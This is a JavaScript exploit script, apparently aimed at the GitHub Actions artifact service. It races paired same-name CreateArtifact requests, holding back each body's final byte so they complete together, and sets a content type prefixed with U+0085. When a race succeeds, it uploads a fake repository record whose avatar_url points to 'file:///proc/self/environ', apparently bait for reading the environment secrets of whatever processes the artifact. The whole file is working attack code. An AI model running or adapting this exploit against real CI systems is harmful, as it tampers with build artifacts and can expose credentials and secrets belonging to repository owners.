import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"synchronized-race"}');
const placeholderHash = createHash('sha256').update(placeholder).digest('hex');
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function createBody(name, version, mimeType) {
  return Buffer.from(JSON.stringify({
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    name,
    version,
    mime_type: mimeType,
  }));
}

function gatedCreate(name, version, mimeType, gate) {
  const bytes = createBody(name, version, mimeType);
  const stream = new ReadableStream({
    start(controller) {
      controller.enqueue(bytes.subarray(0, -1));
      gate.then(() => {
        controller.enqueue(bytes.subarray(-1));
        controller.close();
      });
    },
  });
  return fetch(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      'content-type': 'application/json',
    },
    body: stream,
    duplex: 'half',
  }).then(async response => {
    const text = await response.text();
    let data = {};
    try { data = JSON.parse(text); } catch {}
    return {
      status: response.status,
      url: data.signed_upload_url || data.signedUploadUrl || '',
      message: String(data.msg || text).slice(0, 120),
    };
  });
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
}

async function finalize(name) {
  const value = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({value: `sha256:${placeholderHash}`}),
  });
  return String(value.artifactId);
}

async function signedType(name) {
  const value = await client.GetSignedArtifactURL({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
  });
  const url = new URL(value.signedUrl);
  return {rsct: url.searchParams.get('rsct'), url};
}

function carrier(artifactId) {
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
  return {
    repository,
    bytes: Buffer.from(JSON.stringify({
      full_name: repository,
      owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
      description: 'Repo Cassette synchronized carrier',
      stargazers_count: 0,
    })),
  };
}

const total = 240;
const groupSize = 5;
const counts = {json: 0, zip: 0, odd: 0, failed: 0};
const winners = [];

for (let offset = 0; offset < total; offset += groupSize) {
  let release;
  const gate = new Promise(resolve => { release = resolve; });
  const trials = [];
  for (let i = offset; i < Math.min(total, offset + groupSize); i++) {
    const name = `sync-${process.env.GITHUB_RUN_ID}-${i}`;
    const specs = i % 2
      ? [[7, 'application/json'], [6, odd]]
      : [[6, odd], [7, 'application/json']];
    trials.push({
      i, name,
      promises: specs.map(([version, mime]) => gatedCreate(name, version, mime, gate)),
    });
  }

  // Let each request send all but the last JSON byte, then complete the group
  // together so the handlers contend on the same-name uniqueness boundary.
  await sleep(250);
  release();
  const createdRows = await Promise.all(trials.map(async trial => ({
    ...trial,
    created: await Promise.all(trial.promises),
  })));

  await Promise.all(createdRows.flatMap(row =>
    row.created.filter(item => item.url).map(item =>
      upload(item.url, placeholder).catch(() => {}))));

  await Promise.all(createdRows.map(async row => {
    try {
      const finals = await Promise.allSettled([finalize(row.name), finalize(row.name)]);
      const idsFound = [...new Set(finals.filter(x => x.status === 'fulfilled').map(x => x.value))];
      if (!idsFound.length) throw new Error('no finalized id');
      const {rsct} = await signedType(row.name);
      if (rsct === 'application/json') counts.json++;
      else if (rsct === 'application/zip') counts.zip++;
      else if (rsct?.includes('\u0085')) counts.odd++;
      else counts.failed++;

      if (rsct?.includes('\u0085')) {
        for (const artifactId of idsFound) {
          const item = carrier(artifactId);
          await Promise.all(row.created.filter(x => x.url).map(x => upload(x.url, item.bytes)));
          const winner = {index: row.i, name: row.name, artifactId, rsct, repository: item.repository};
          winners.push(winner);
          console.log(`WINNER ${JSON.stringify(winner)}`);
        }
      }
    } catch (error) {
      counts.failed++;
      console.log(`RACE_ERROR ${JSON.stringify({index: row.i, error: String(error).slice(0, 180)})}`);
    }
  }));

  console.log(`PROGRESS ${JSON.stringify({done: Math.min(total, offset + groupSize), counts, winners: winners.length})}`);
}

console.log(`RACE_SUMMARY ${JSON.stringify({total, counts, winners})}`);
